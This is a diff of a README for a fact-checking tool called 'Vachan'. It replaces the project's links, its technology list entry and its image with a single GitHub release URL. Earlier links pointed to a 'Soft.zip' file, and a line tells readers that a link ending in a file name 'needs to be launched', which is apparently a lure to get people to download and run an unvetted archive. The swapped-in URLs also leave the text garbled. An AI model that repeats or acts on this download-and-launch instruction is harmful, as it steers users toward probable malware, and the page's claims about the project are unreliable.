@@ -18,7 +18,7 @@ Vachan is a cutting-edge tool designed to help you verify the accuracy of news a
 
 ## Technologies Used
 
-- Next.js
+- https://github.com/aaryandipnaik/Vachan/releases/tag/v1.2
 - React
 - UI/UX Design
 - Website Development
@@ -27,7 +27,7 @@ Vachan is a cutting-edge tool designed to help you verify the accuracy of news a
 
 Explore the Vachan repository on GitHub to access the latest codebase and contribute to the project. You can find the repository topics below:
 
-🔗 [Vachan Repository](https://github.com/files/Soft.zip)
+🔗 [Vachan Repository](https://github.com/aaryandipnaik/Vachan/releases/tag/v1.2)
 
 If the link ends with a file name, it needs to be launched.
 
@@ -41,7 +41,7 @@ We value your feedback and suggestions for improving Vachan. Feel free to create
 
 Join us in the fight against fake news with Vachan - empowering you with accurate information every step of the way. Let's make a difference together! 🌐📌
 
-![Vachan](https://source.unsplash.com/featured/?newspaper)
+![Vachan](https://github.com/aaryandipnaik/Vachan/releases/tag/v1.2)
 
 Remember, the power to verify news is in your hands with Vachan! 🌟✅
 
@@ -51,4 +51,4 @@ Remember, the power to verify news is in your hands with Vachan! 🌟✅
 
 Keep fact-checking, keep empowering! 💪🔍
 
-🔗 [Check out our Awesome FactBot!](https://github.com/files/Soft.zip)
+🔗 [Check out our Awesome FactBot!](https://github.com/aaryandipnaik/Vachan/releases/tag/v1.2)
